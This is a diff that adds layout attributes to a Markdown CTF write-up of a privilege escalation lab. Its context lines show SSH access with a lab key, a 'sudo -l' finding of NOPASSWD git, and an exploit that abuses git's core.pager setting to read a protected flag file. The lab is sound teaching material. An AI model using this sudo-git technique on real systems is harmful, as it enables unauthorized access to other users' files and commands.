@@ -27,14 +27,17 @@ unzip privilege_escalation_1.zip
 # Inflating: id_ecdsa
 # Extracting: username.txt
 ```
+{: .ms-4 }
 
 ![Unzip Output](/assets/img/ptgarage/privilege_escalation_lab1/img_2_1.png)
+{: .ms-4 }
 
 We use these credentials to SSH into the target:
 
 ```bash
 ssh -i id_ecdsa user@172.31.13.45 -p 323603
 ```
+{: .ms-4 }
 
 ### 2. Privilege Escalation Vector
 
@@ -45,11 +48,13 @@ ls -la /home/ctf
 cat /home/ctf/flag
 # cat: /home/ctf/flag: Permission denied
 ```
+{: .ms-4 }
 
 Checking our sudo privileges:
 ```bash
 sudo -l
 ```
+{: .ms-4 }
 
 **Output:**
 ```text
@@ -59,6 +64,7 @@ Matching Defaults entries for user on ctf-rahulshashidhar-...:
 User user may run the following commands on ctf-rahulshashidhar-...:
     (ctf : ctf) NOPASSWD: /usr/bin/git
 ```
+{: .ms-4 }
 
 ### 3. Exploitation
 
@@ -75,13 +81,16 @@ sudo -u ctf git config --global core.pager 'cat /home/ctf/flag'
 # Trigger the pager by listing the config with pagination forced
 sudo -u ctf git -p config --list
 ```
+{: .ms-4 }
 
 ![Flag Execution](/assets/img/ptgarage/privilege_escalation_lab1/img_4_1.png)
+{: .ms-4 }
 
 This successfully triggers the payload and prints the flag:
 ```text
 ctf{esc4l4t!ng_pr!v!l3g3s}
 ```
+{: .ms-4 }
 
 ### 4. Mitigation
 
